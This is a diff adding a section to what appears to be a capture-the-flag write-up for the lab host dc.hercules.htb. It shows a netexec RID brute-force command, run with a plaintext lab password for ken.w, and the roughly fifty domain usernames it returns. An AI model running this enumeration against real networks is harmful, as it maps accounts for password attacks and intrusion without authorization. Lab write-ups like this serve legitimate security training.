@@ -410,5 +410,67 @@ SMB         dc.hercules.htb 445    dc               Users           READ
 
 Read access on the Users share
 
+## Users
+```python
+nxc smb dc.hercules.htb -u ken.w -p 'change*th1s_p@ssw()rd!!' -k --rid-brute 20000 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
+Administrator
+Guest
+krbtgt
+DC$
+jessica.e
+mikayla.a
+stephanie.w
+johanna.f
+heather.s
+camilla.b
+iis_administrator
+taylor.m
+fernando.r
+james.s
+anthony.r
+iis_webserver$
+iis_hadesapppool$
+iis_apppoolidentity$
+iis_defaultapppool$
+auditor
+vincent.g
+nate.h
+stephen.m
+mark.s
+elijah.m
+angelo.o
+ashley.b
+clarissa.c
+winda.s
+rene.s
+will.s
+zeke.s
+adriana.i
+tish.c
+jennifer.a
+shae.j
+joel.c
+jacob.b
+web_admin
+bob.w
+ken.w
+johnathan.j
+harris.d
+ray.n
+natalie.a
+ramona.l
+fiona.c
+patrick.s
+tanya.r
+WINSRV01-2016$
+WINSRV02-2016$
+WINSRV03-2016$
+ENTERPRISE01-8.1$
+ENTERPRISE02-8.1$
+Admin
+```
+
+I will now dump all the users in the domain!
+
 
 
